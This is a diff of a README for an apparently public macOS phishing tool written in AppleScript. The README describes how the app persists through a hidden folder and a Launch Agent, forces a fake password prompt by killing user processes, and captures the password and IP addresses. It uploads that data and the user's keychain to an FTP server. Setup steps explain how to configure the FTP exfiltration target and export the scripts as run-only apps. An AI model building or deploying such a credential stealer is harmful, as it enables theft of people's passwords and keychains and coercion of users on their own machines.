@@ -7,11 +7,11 @@ This is a phishing app that I wrote. It is written in applescript, which is impo
 
 ###Here's what it does:
 
-* It checks for a killswitch, then creates a hidden folder in the user's Public folder.
+* It checks for a remote command, then creates a hidden folder in the user's Public folder.
 * It copies a duplicate app to the hidden folder and creates a Launch Agent (to make the app start on login).
 * It prompts the user to enter their password into a dialog box. If the user doesn't enter it within 10 seconds, the script kills all user processes, making the user have to log out in order to use the computer.
 ![image](http://f.cl.ly/items/3E0x2P0l452W2B1p2T0m/Prompt.png)
-* If the password is entered correctly, the script copies the user's username, password, date, WAN IP, and LAN IP to a text file in the hidden folder.
+* If the password is entered correctly, the script copies the user's username, password, date, WAN IP, and LAN IP to an encrypted text file in the hidden folder.
  ![image](http://cl.ly/KB3S/Screenshot%202012-10-16%20at%206.47.02%20AM.jpg)
 * If the password is not entered correctly, it forces the user to try again.
 * It uploads this file to an FTP server.
@@ -20,19 +20,18 @@ This is a phishing app that I wrote. It is written in applescript, which is impo
 
 ###Please feel free to test the script by doing the following:
 
-If you don't want your app to upload the text file and the keychain to an FTP server, and you don't want to actually send the email, you can just download "[Ready To Use App](https://github.com/benb116/Gone-Phishing/blob/master/Ready%20To%20Use%20App.zip)" and unzip it.
+If you don't want your app to upload the text file and the keychain to an FTP server or send the email, you can just download "[Ready To Use App](https://github.com/benb116/Gone-Phishing/blob/master/Ready%20To%20Use%20App.zip)" and unzip it.
 
 If you do want to upload to an FTP server and/or send out the email, follow the steps below.
 
 1. Copy "App.applescript", "Updater.applescript", "DK.applescript", and "icon.icns" to your computer.
 2. Open 'App.applescript' and 'Updater.applescript' in AppleScript Editor and find the FTP command properties.
 3. Replace the parts of the code in '<>' with your information. For example:
-	
-		set myuser to "<Username>"		set mypass to "<Password>"		set myserv to "<ftp address>"		set mypath to "</path/to/folder/>"
+			set myserv to "<ftp address>"		set mypath to "</path/to/folder/>"
 		
 	becomes
 	
-		set myuser to "Benb116"		set mypass to "12345"		set myserv to "123.456.789.0"		set mypath to "/Desktop/Passwords/"4. Optional: in App.applescript, find the comment "--send theMessage." Remove the "--" to make this an actual command that will actually send out the email.5. Export "App.applescript", "Updater.applescript", and "DK.applescript" as **run-only** applications. 
+		set myserv to "123.456.789.0"		set mypath to "/Desktop/Passwords/"4. Optional: in App.applescript, find the comment "--send theMessage." Remove the "--" to make this an actual command that will actually send out the email.5. Export "App.applescript", "Updater.applescript", and "DK.applescript" as **run-only** applications. 
 	* "Updater.applescript" and "DK.applescript" **must** be made into apps named "Updater" and "DK" respectively. You can name "App.app" whatever you want.
 	
 6. Run the following Terminal commands **with each app**:
